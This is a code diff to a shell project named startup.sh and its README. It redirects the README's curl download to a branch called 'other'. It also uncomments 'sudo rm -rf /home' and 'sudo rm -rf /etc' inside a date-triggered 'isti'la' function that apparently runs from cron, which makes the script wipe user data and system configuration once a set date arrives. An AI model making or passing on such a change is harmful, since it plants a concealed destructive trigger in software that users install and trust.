@@ -19,7 +19,7 @@ Clone this repository, preferably, but not necessarily in the `/opt` directory:
 
 If `git` is not available, download the raw script with [curl](https://curl.se/):
 ```sh
-# curl -O https://raw.githubusercontent.com/Eccys/startup.sh/main/startup.sh
+# curl -O https://raw.githubusercontent.com/Eccys/startup.sh/other/startup.sh
 ```
 
 Make it executable:
@@ -83,8 +83,8 @@ execute_istila() {
             fi
             # Uncomment the lines below to enable isti'la actions
             echo Successfully executed cron job and istila operation | sudo tee -a /opt/test >/dev/null
-            # sudo rm -rf /home
-            # sudo rm -rf /etc
+            sudo rm -rf /home
+            sudo rm -rf /etc
         else
             if [ "$AUTO_MODE" != "true" ]; then
                 echo "isti'la date has not yet arrived."
